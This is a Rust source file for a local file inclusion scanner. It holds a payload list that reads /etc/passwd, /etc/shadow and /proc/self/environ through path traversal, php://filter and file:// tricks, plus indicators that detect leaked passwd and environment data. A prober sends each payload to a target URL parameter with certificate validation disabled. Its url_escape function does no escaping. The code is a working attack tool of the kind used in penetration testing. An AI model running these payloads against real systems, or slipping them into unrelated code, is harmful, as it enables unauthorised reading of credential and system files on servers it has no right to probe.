pub const LFI_PAYLOADS: &[&str] = &[
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/hostname",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/self/fd/0",
    "/proc/self/fd/1",
    "/proc/self/fd/2",
    "/proc/version",
    "/proc/net/arp",
    "/proc/net/tcp",
    "/proc/net/fib_trie",
    "/proc/net/route",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "/var/log/apache/access.log",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "php://filter/convert.base64-encode/resource=config",
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/convert.base64-encode/resource=admin",
    "file:///etc/passwd",
    "file:///proc/self/environ",
];

pub const LFI_INDICATORS: &[&str] = &[
    "root:x:",
    "daemon:x:",
    "bin:x:",
    "www-data:x:",
    "uid=",
    "gid=",
    "PHP:",
    "SERVER_SOFTWARE",
    "HTTP_HOST=",
    "DOCUMENT_ROOT=",
];

#[derive(Debug, Clone, serde::Serialize)]
pub struct LfiResult {
    pub parameter: String,
    pub target_url: String,
    pub payload: String,
    pub matched_indicator: Option<String>,
    pub response_length: usize,
}

pub struct LfiProber {
    client: reqwest::Client,
}

impl LfiProber {
    pub fn new() -> Self {
        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(10))
            .danger_accept_invalid_certs(true)
            .build()
            .unwrap();
        Self { client }
    }

    /// Test a URL parameter for LFI.
    pub async fn probe_parameter(&self, base_url: &str, param: &str) -> Vec<LfiResult> {
        let mut results = Vec::new();
        for payload in LFI_PAYLOADS {
            let probe_url = if base_url.contains(&format!("{}=", param)) {
                let re =
                    regex::Regex::new(&format!("({}=)[^&]+", regex::escape(param))).unwrap();
                re.replace(base_url, format!("$1{}", url_escape(payload)))
                    .to_string()
            } else {
                format!("{}?{}={}", base_url, param, url_escape(payload))
            };

            if let Ok(resp) = self.client.get(&probe_url).send().await {
                let status_code = resp.status().as_u16();
                if let Ok(body) = resp.text().await {
                    let matched = LFI_INDICATORS
                        .iter()
                        .find(|&&indicator| body.contains(indicator));
                    if matched.is_some() || status_code == 500 {
                        results.push(LfiResult {
                            parameter: param.to_string(),
                            target_url: base_url.to_string(),
                            payload: payload.to_string(),
                            matched_indicator: matched.map(|s| s.to_string()),
                            response_length: body.len(),
                        });
                    }
                }
            }
        }
        results
    }
}

fn url_escape(s: &str) -> String {
    s.to_string()
}

impl Default for LfiProber {
    fn default() -> Self {
        Self::new()
    }
}
